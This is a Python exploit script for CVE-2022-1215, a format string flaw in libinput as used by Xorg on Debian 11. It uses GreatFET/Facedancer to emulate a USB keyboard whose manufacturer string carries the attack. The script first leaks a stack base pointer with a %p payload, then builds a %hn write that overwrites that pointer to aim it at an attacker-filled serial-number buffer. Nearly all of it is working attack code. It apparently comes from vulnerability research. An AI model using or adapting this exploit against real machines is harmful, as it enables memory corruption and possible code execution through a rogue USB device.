#!/usr/bin/env python3
# -*- coding: latin-1 -*-
# pylint: disable=unused-wildcard-import, wildcard-import
# /////// ++++++++++++ +++++++++++ +++++++++++ +++++++++++ ++++++++++ \\\\\\\\\\
#                               by: @hyprdude
#                             CVE: CVE-2022-1215
# ~~~~~ RBP overwrite via format string exploit using GreatFET/Facedancer ~~~~~
#    - OS: Debian 11 Stable XFCE, as of 2022-08-13
#    - xserver-xorg-core_1.20.11-1+deb11u1_amd64.deb built from Debian sources
#    - libinput10_1.16.4-3_amd64.deb built from Debian sources, dbg symbols enabled
#    - Disabled FORTIFY, all other security flags enabled
# \\\\\\\ ++++++++++++ +++++++++++ ++++++++++++ +++++++++++ +++++++++ //////////
# ---
import os
import sys
import asyncio
import logging
import pwn
from uuid import uuid4
from facedancer import main
from facedancer.devices.keyboard import USBKeyboardDevice


# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# LOGGING
# LOG_FORMAT_COLOR = "\u001b[37;1m%(levelname)-8s| \u001b[0m\u001b[1m%(module)-15s|\u001b[0m %(message)s"
LOG_FORMAT_COLOR = "\u001b[37;1m%(levelname)-8s | \u001b[0m %(message)s"
LOG_LEVEL = 30 # WARNING
# set a custom level
XPRINT_LEVEL = 35
logging.addLevelName(XPRINT_LEVEL, "XPRINT")

# classic sploit printing mandatory
def xprint(self, message, *args, **kws):
    message = "[+] " + message
    # Yes, logger takes its '*args' as 'args'.
    self.log(XPRINT_LEVEL, message, *args, **kws) 

# configure and create the logger
logging.Logger.xprint = xprint
logging.basicConfig(level=LOG_LEVEL, format=LOG_FORMAT_COLOR)
# get the custom logger
xlogger = logging.getLogger()

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# GLOBAL CONSTANTS
# NOTE: RBP will point somewhere in this buffer (i.e. whatever is placed in the SERIAL field of the device)
SERIAL="AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAAB"
# product string value, not important but length may affect offsets
PRODUCT="AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAA\xaa\xa3\xa4AAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAAB"
# Param index where target RBP will be
RBP_INDEX = 46
# unique ID for each run
RUN_ID = uuid4().bytes.hex()[:8]


# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# = RBP LEAK =
# custom async function to limit connection time so it doesnt stay connected
# forever. this is used to first leak the RBP value that will be used for the exploit.
async def leak_main(leak_dev):
    # connect
    leak_dev.connect()
    # Sanity check to avoid common issues.
    if len(leak_dev.configurations) == 0:
        logging.error("No configurations defined on the emulated device! "
                "Did you forget @use_inner_classes_automatically?")
    if leak_dev.backend is None:
        leak_dev.connect()
    # dont stay connected forever
    x = 0
    while True:
        leak_dev.backend.service_irqs()
        await asyncio.sleep(0)
        x += 1
        if x > 15000: break
    leak_dev.disconnect()

def info_leak_run():
    # create the device
    LEAK_PAYLOAD = f"[[<{RUN_ID}> param index {RBP_INDEX}: %{RBP_INDEX}$p ]]"
    LEAK_DEV = USBKeyboardDevice()
    LEAK_DEV.serial_number_string = SERIAL
    LEAK_DEV.product_string = PRODUCT
    LEAK_DEV.manufacturer_string = LEAK_PAYLOAD
    LEAK_DEV.product_id = 0x1337
    LEAK_DEV.vendor_id = 0x1337
    # connect using the infoleak payload to leak target RBP
    xlogger.xprint("Running info leak exploit to leak target RBP for overwrite...")
    xlogger.xprint("Connecting device, please wait....")
    asyncio.run(leak_main(LEAK_DEV))
    xlogger.xprint("Done, device disconnected")

    # ask for the RBP value to proceed with exploit
    print(f"\n[+] Run on target to get leaked value: `grep -m 1 -E \"{RUN_ID}.*0x7ff.*\" /var/log/Xorg.0.log | cut -d \" \" -f 10`")
    LEAKED_RBP = ""
    try:
        while LEAKED_RBP == "":
            LEAKED_RBP = input("[+] Enter the leaked RBP value: ")
            if LEAKED_RBP == "":
                logging.error("RBP value cannot be empty")
        LEAKED_RBP = int(LEAKED_RBP, base=16)
        print()
    except KeyboardInterrupt:
        logging.warning("\nGot interrupt, disconnecting and bailing out...")
        sys.exit(0)
    return LEAKED_RBP

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# RBP OVERWRITE EXPLOIT
# generate payloads
def generate_rbp_overwrite_payload(leaked_rbp):
    PADDER = "_"        # padding char
    OFFSET = 5955 -(16*1)-0x660 - 1      # offset from target RBP to get to SERIAL buffer
    ALIGNED_LEN = 123   # length to align payload to
    # ALIGNED_LEN = 123   # length to align payload to

    # the address where the Z's buffer will be located
    z_addr = leaked_rbp - OFFSET # the offset was calc'd while attached w/ gdb

    # the least significant bit of the Z's addr
    # this is going to be the value we try to write at the LSB of the leaked RBP
    z_addr_lsb = (z_addr | 0xffffffff0000) ^ 0xffffffff0000

    # number of bytes that will have already been written due to prepended string
    already_written = len("event8  - ")

    # the width that will be used in the format string as padding to increment the number of bytes written
    # to match the LSB value we're trying to write
    target_width = z_addr_lsb - already_written

    # the format string for the payload with calculated values
    payload = f"%1$0{target_width}x %{RBP_INDEX}$hn"

    # calculate how much padding will be needed
    padding = PADDER * (ALIGNED_LEN - len(payload))

    # print final payload
    final = f"{payload}{padding}"

    # debug messages
    xlogger.xprint(f"using leaked $rbp {hex(leaked_rbp)} for calculations")
    xlogger.xprint(f"SERIAL buffer should be at <$leaked_rbp-{OFFSET}>: {hex(z_addr)}")
    xlogger.xprint(f"will overwrite target RBP's LSB with: {hex(z_addr_lsb)}")
    xlogger.xprint(f"using this width to write the LSB value via %hn: {target_width}")
    xlogger.xprint(f"aligned payload to {ALIGNED_LEN} bytes")
    xlogger.xprint(f"PAYLOAD = {final}")
    return final

# run the payload
def rbp_overwrite_run(leaked_rbp):
    FMT_PAYLOAD = generate_rbp_overwrite_payload(leaked_rbp)
    other_serial = "\x00\x00\x7f\xff\x13\x37\xb0\xb2" * 15

    # create the device
    DEVICE = USBKeyboardDevice()
    DEVICE.serial_number_string = other_serial
    DEVICE.product_string = PRODUCT
    DEVICE.manufacturer_string = FMT_PAYLOAD
    DEVICE.product_id = 0x1337
    DEVICE.vendor_id = 0x1337

    xlogger.xprint(f"MANUFACTURER = PAYLOAD")
    if len(DEVICE.serial_number_string) > 50:
        xlogger.xprint(f"SERIAL = {DEVICE.serial_number_string[:50]}...({len(DEVICE.serial_number_string)-50} more)")
    else:
        xlogger.xprint(f"SERIAL = {DEVICE.serial_number_string}")
    if len(DEVICE.product_string) > 50:
        xlogger.xprint(f"PRODUCT = {DEVICE.product_string[:50]}...({len(DEVICE.product_string)-50} more)")
    else:
        xlogger.xprint(f"PRODUCT = {DEVICE.product_string}")

    # connect the device to trigger the overwrite exploit
    input("\n[+] Ready. Press Enter to continue....")
    main(DEVICE)

# run the exploits
leaked = info_leak_run()
rbp_overwrite_run(leaked)

